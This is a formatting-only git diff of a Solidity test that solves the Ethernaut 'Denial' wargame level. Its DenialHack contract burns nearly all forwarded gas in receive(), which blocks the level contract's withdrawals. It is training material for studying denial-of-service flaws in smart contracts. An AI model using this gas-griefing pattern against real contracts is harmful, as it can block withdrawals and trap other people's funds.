@@ -7,16 +7,14 @@ import { Ethernaut } from "src/Ethernaut.sol";
 import "forge-std/console2.sol";
 
 contract DenialHack {
-
-    constructor() {
-    }
+    constructor() { }
 
     receive() external payable {
         // need to consume gas so the gasleft is < 2300
 
         uint256 i;
         while (gasleft() > 2300) {
-            i = i**2;
+            i = i ** 2;
         }
     }
 }
@@ -43,7 +41,7 @@ contract DenialTest is Test {
         DenialHack attacker = new DenialHack();
         denial.setWithdrawPartner(address(attacker));
         assertEq(denial.partner(), address(attacker));
-        
+
         // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
